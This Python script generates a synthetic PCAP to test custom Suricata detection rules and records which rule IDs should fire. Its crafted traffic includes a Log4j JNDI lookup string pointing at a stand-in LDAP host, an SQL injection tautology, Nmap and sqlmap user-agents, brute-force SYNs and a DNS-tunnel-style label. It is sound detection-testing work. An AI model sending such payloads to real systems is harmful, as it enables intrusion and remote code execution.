#!/usr/bin/env python3
"""
gen_test_pcap.py — craft a real PCAP that triggers this project's custom rules.

Why this exists: to measure a detection rate you need ground truth — you must
know which packets are malicious before you run the sensor. Downloading a
malware PCAP gives you real traffic but the labels are someone else's, and you
have to handle live malware samples to get it.

This builds valid Ethernet/IP/TCP/UDP frames from scratch (stdlib only, no
scapy) carrying traffic engineered to fire specific SIDs. You know exactly what
should alert, so detection rate, false negatives and rule coverage are all
directly computable.

All addresses are RFC 5737 documentation ranges. Nothing here is live malware;
the payloads are benign strings that match detection patterns.

    python3 gen_test_pcap.py -o ../data/output.pcap
    suricata -c config/suricata.yaml -S rules/local.rules -r data/output.pcap -l logs/ -k none
"""

from __future__ import annotations

import argparse
import os
import struct
import time

# --- layer 2/3/4 primitives --------------------------------------------------

FIN, SYN, RST, PSH, ACK = 0x01, 0x02, 0x04, 0x08, 0x10

MAC_CLIENT = bytes.fromhex("020000000001")
MAC_SERVER = bytes.fromhex("020000000002")


def checksum16(data: bytes) -> int:
    """Standard internet checksum (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def ip_to_bytes(ip: str) -> bytes:
    return bytes(int(o) for o in ip.split("."))


def eth(dst: bytes, src: bytes) -> bytes:
    return dst + src + b"\x08\x00"  # ethertype IPv4


def ipv4(src: str, dst: str, proto: int, payload: bytes, ident: int) -> bytes:
    total_len = 20 + len(payload)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,            # version 4, IHL 5
        0x00,            # DSCP/ECN
        total_len,
        ident,
        0x4000,          # don't fragment
        64,              # TTL
        proto,
        0,               # checksum placeholder
        ip_to_bytes(src),
        ip_to_bytes(dst),
    )
    csum = checksum16(hdr)
    hdr = hdr[:10] + struct.pack("!H", csum) + hdr[12:]
    return hdr + payload


def l4_checksum(src: str, dst: str, proto: int, segment: bytes) -> int:
    """TCP/UDP checksum over the IPv4 pseudo-header plus the segment."""
    pseudo = ip_to_bytes(src) + ip_to_bytes(dst) + struct.pack("!BBH", 0, proto, len(segment))
    return checksum16(pseudo + segment)


def tcp(src: str, dst: str, sport: int, dport: int, seq: int, ack: int,
        flags: int, payload: bytes = b"") -> bytes:
    hdr = struct.pack(
        "!HHIIBBHHH",
        sport, dport, seq, ack,
        0x50,            # data offset 5 words, no options
        flags,
        65535,           # window
        0,               # checksum placeholder
        0,               # urgent pointer
    )
    csum = l4_checksum(src, dst, 6, hdr + payload)
    hdr = hdr[:16] + struct.pack("!H", csum) + hdr[18:]
    return hdr + payload


def udp(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    hdr = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    csum = l4_checksum(src, dst, 17, hdr + payload)
    hdr = hdr[:6] + struct.pack("!H", csum) + hdr[8:]
    return hdr + payload


# --- pcap container ----------------------------------------------------------

class PcapWriter:
    def __init__(self, path: str, start: float):
        self.fh = open(path, "wb")
        # magic, v2.4, tz 0, sigfigs 0, snaplen 65535, linktype 1 (Ethernet)
        self.fh.write(struct.pack("!IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        self.t = start
        self.count = 0

    def write(self, frame: bytes, advance: float = 0.001) -> None:
        sec = int(self.t)
        usec = int((self.t - sec) * 1_000_000)
        self.fh.write(struct.pack("!IIII", sec, usec, len(frame), len(frame)))
        self.fh.write(frame)
        self.t += advance
        self.count += 1

    def close(self) -> None:
        self.fh.close()


# --- session builders --------------------------------------------------------

class Session:
    """A TCP session. Suricata needs a completed 3-way handshake before
    flow:established,to_server matches, so we always build the full thing."""

    _ident = 1000

    def __init__(self, w: PcapWriter, csrc: str, cdst: str, sport: int, dport: int):
        self.w, self.src, self.dst, self.sport, self.dport = w, csrc, cdst, sport, dport
        self.cseq, self.sseq = 1000, 5000

    def _ident_next(self) -> int:
        Session._ident += 1
        return Session._ident

    def _c2s(self, flags: int, payload: bytes = b"") -> None:
        seg = tcp(self.src, self.dst, self.sport, self.dport, self.cseq, self.sseq, flags, payload)
        self.w.write(eth(MAC_SERVER, MAC_CLIENT) + ipv4(self.src, self.dst, 6, seg, self._ident_next()))

    def _s2c(self, flags: int, payload: bytes = b"") -> None:
        seg = tcp(self.dst, self.src, self.dport, self.sport, self.sseq, self.cseq, flags, payload)
        self.w.write(eth(MAC_CLIENT, MAC_SERVER) + ipv4(self.dst, self.src, 6, seg, self._ident_next()))

    def handshake(self) -> None:
        self._c2s(SYN)
        self.cseq += 1
        self._s2c(SYN | ACK)
        self.sseq += 1
        self._c2s(ACK)

    def request(self, data: bytes) -> None:
        self._c2s(PSH | ACK, data)
        self.cseq += len(data)
        self._s2c(ACK)

    def response(self, data: bytes) -> None:
        self._s2c(PSH | ACK, data)
        self.sseq += len(data)
        self._c2s(ACK)

    def teardown(self) -> None:
        self._c2s(FIN | ACK)
        self.cseq += 1
        self._s2c(FIN | ACK)
        self.sseq += 1
        self._c2s(ACK)


def http_exchange(w: PcapWriter, src: str, dst: str, sport: int, request: bytes,
                  body: bytes = b"OK") -> None:
    s = Session(w, src, dst, sport, 80)
    s.handshake()
    s.request(request)
    s.response(
        b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/html\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    s.teardown()


def dns_query(w: PcapWriter, src: str, dst: str, sport: int, name: str, qid: int) -> None:
    qname = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    msg = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0) + qname + struct.pack("!HH", 1, 1)
    seg = udp(src, dst, sport, 53, msg)
    w.write(eth(MAC_SERVER, MAC_CLIENT) + ipv4(src, dst, 17, seg, 7000 + qid % 1000))


# --- the scenarios -----------------------------------------------------------

def build(path: str) -> list[tuple[int, str]]:
    """Write the PCAP. Returns the ground truth: (sid, description) expected to fire."""
    start = time.time() - 3600
    w = PcapWriter(path, start)
    truth: list[tuple[int, str]] = []

    # --- benign background so the capture is not 100% malicious ---------------
    for i in range(6):
        http_exchange(
            w, "192.0.2.10", "198.51.100.5", 40000 + i,
            b"GET /index.html HTTP/1.1\r\nHost: www.example.com\r\n"
            b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\n"
            b"Accept: text/html\r\n\r\n",
        )
    for i, name in enumerate(["www.example.com", "cdn.example.net", "api.example.org"]):
        dns_query(w, "192.0.2.10", "198.51.100.1", 50000 + i, name, 100 + i)

    # --- SID 1000001 : Nmap NSE user-agent (EXTERNAL -> HOME) -----------------
    http_exchange(
        w, "203.0.113.7", "192.0.2.10", 44321,
        b"GET /status HTTP/1.1\r\nHost: 192.0.2.10\r\n"
        b"User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; "
        b"https://nmap.org/book/nse.html)\r\n\r\n",
    )
    truth.append((1000001, "Nmap NSE user-agent"))

    # --- SID 1000002 : empty user-agent (EXTERNAL -> HOME) --------------------
    http_exchange(
        w, "203.0.113.90", "192.0.2.10", 44500,
        b"GET /health HTTP/1.1\r\nHost: 192.0.2.10\r\nUser-Agent: \r\n\r\n",
    )
    truth.append((1000002, "empty user-agent"))

    # --- SID 1000003 : SSH brute force, threshold 5 in 60s by_src -------------
    # Eight bare SYNs from one source. The rule thresholds at 5, so this fires
    # once — which is the point of using threshold rather than a bare match.
    for i in range(8):
        seg = tcp("203.0.113.66", "192.0.2.12", 55000 + i, 22, 2000 + i, 0, SYN)
        w.write(eth(MAC_SERVER, MAC_CLIENT) + ipv4("203.0.113.66", "192.0.2.12", 6, seg, 8000 + i),
                advance=2.0)
    truth.append((1000003, "SSH brute force (8 SYNs, thresholds at 5)"))

    # --- SID 1000004 : cleartext password POST (HOME -> EXTERNAL) -------------
    body = b"username=admin&password=hunter2&submit=Login"
    http_exchange(
        w, "192.0.2.11", "198.51.100.44", 45010,
        b"POST /login HTTP/1.1\r\nHost: legacy.example.org\r\n"
        b"User-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body,
    )
    truth.append((1000004, "cleartext password over HTTP"))

    # --- SID 1000005 : Log4j JNDI in a header value ---------------------------
    # Benign string in a header. Nothing is executed; this only matches a pattern.
    http_exchange(
        w, "203.0.113.33", "192.0.2.10", 44700,
        b"GET / HTTP/1.1\r\nHost: 192.0.2.10\r\nUser-Agent: curl/8.4.0\r\n"
        b"X-Api-Version: ${jndi:ldap://198.51.100.200:1389/a}\r\n\r\n",
    )
    truth.append((1000005, "Log4j JNDI lookup in header"))

    # --- SID 1000006 : SQL injection tautology in URI -------------------------
    # %20 encodes the spaces so Suricata's normalised http.uri buffer contains
    # real whitespace for the pcre to match.
    http_exchange(
        w, "203.0.113.44", "192.0.2.10", 44800,
        b"GET /index.php?id=1%27%20OR%201%3D1 HTTP/1.1\r\n"
        b"Host: 192.0.2.10\r\nUser-Agent: sqlmap/1.7\r\n\r\n",
    )
    truth.append((1000006, "SQLi tautology in URI"))

    # --- SID 1000007 : DNS query to sinkhole domain ---------------------------
    dns_query(w, "192.0.2.77", "198.51.100.1", 51000, "sinkhole.example-abuse.net", 201)
    truth.append((1000007, "DNS query to sinkhole domain"))

    # --- SID 1000008 : long DNS label, classic exfil signature ----------------
    dns_query(w, "192.0.2.77", "198.51.100.1", 51001,
              "a" * 62 + ".tunnel.example-bad.org", 202)
    truth.append((1000008, "abnormally long DNS label"))

    # --- SID 1000010 : canary -------------------------------------------------
    http_exchange(
        w, "192.0.2.10", "198.51.100.90", 46000,
        b"GET /uid/index.html HTTP/1.1\r\nHost: testmynids.org\r\n"
        b"User-Agent: curl/8.4.0\r\n\r\n",
    )
    truth.append((1000010, "canary — testmynids.org"))

    w.close()
    return truth


def main() -> int:
    p = argparse.ArgumentParser(description="Build a ground-truth test PCAP.")
    p.add_argument("-o", "--output", default="../data/output.pcap")
    p.add_argument("--truth", default=None, help="also write ground truth SIDs here")
    args = p.parse_args()

    os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    truth = build(args.output)

    size = os.path.getsize(args.output)
    print(f"[+] wrote {args.output} ({size:,} bytes)")
    print(f"[+] {len(truth)} rules should fire:\n")
    for sid, desc in truth:
        print(f"      SID {sid}  {desc}")

    if args.truth:
        with open(args.truth, "w", encoding="utf-8") as fh:
            for sid, desc in truth:
                fh.write(f"{sid},{desc}\n")
        print(f"\n[+] ground truth -> {args.truth}")

    print("\n[*] Not covered: SID 1000009 (TLS SNI) needs a real ClientHello —")
    print("    test that one against live traffic instead.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
